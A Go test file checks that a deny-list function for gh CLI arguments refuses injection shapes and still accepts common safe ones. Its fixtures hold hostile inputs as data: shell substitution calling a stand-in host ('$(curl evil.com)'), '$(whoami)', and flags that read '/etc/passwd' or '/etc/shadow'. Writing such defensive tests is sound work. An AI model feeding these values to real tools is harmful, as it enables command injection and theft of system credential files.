package tools

import (
	"strings"
	"testing"
)

// TestRejectGHFlagInjection_BlocksDangerousShapes pins VULN-053:
// the patterns that turn an allowed gh subcommand into an
// arbitrary file read or shell-substitution sink must be refused
// regardless of subcommand.
func TestRejectGHFlagInjection_BlocksDangerousShapes(t *testing.T) {
	cases := []struct {
		name      string
		arg       string
		wantHints []string
	}{
		{"single dash F", "-F", []string{"single-dash"}},
		{"single dash f", "-f", []string{"single-dash"}},
		{"body-file flag", "--body-file", []string{"reads an arbitrary file"}},
		{"input flag", "--input", []string{"reads an arbitrary file"}},
		{"input-file flag", "--input-file", []string{"reads an arbitrary file"}},
		{"body-file with value", "--body-file=/etc/passwd", []string{"reads an arbitrary file"}},
		{"field with @path", "--field=@/etc/shadow", []string{"@<path>"}},
		{"raw-field with @path", "--raw-field=@/var/log/auth.log", []string{"@<path>"}},
		{"jq with $()", "--jq=$(curl evil.com)", []string{"shell-substitution"}},
		{"jq with backticks", "--jq=`curl evil.com`", []string{"shell-substitution"}},
		{"value with ${}", "--template=${HOME}", []string{"shell-substitution"}},
		{"path traversal in value", "--header=../etc/passwd", []string{"path-traversal"}},
		{"positional @ value", "@/etc/shadow", []string{"@<path>"}},
		{"positional with $()", "$(whoami)", []string{"shell-substitution"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := rejectGHFlagInjection(c.arg)
			if err == nil {
				t.Fatalf("expected refusal for %q, got nil", c.arg)
			}
			for _, hint := range c.wantHints {
				if !strings.Contains(err.Error(), hint) {
					t.Errorf("error %q should mention %q (input=%q)", err.Error(), hint, c.arg)
				}
			}
		})
	}
}

// TestRejectGHFlagInjection_AllowsSafeShapes confirms the deny-list
// doesn't over-reject — common safe gh shapes must pass.
func TestRejectGHFlagInjection_AllowsSafeShapes(t *testing.T) {
	cases := []string{
		"",                               // empty — early return
		"list",                           // positional subcommand
		"--json",                         // boolean flag (value comes next)
		"--limit=10",                     // numeric value
		"--state=open",                   // enum value
		"--template={{.title}}",          // gh template syntax (no shell)
		"42",                             // PR number
		"--field=name=value",             // safe field syntax
		"https://api.github.com/repos/x", // URL positional
		"--header=Accept: application/vnd.github.v3+json",
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if err := rejectGHFlagInjection(in); err != nil {
				t.Errorf("safe arg %q rejected: %v", in, err)
			}
		})
	}
}
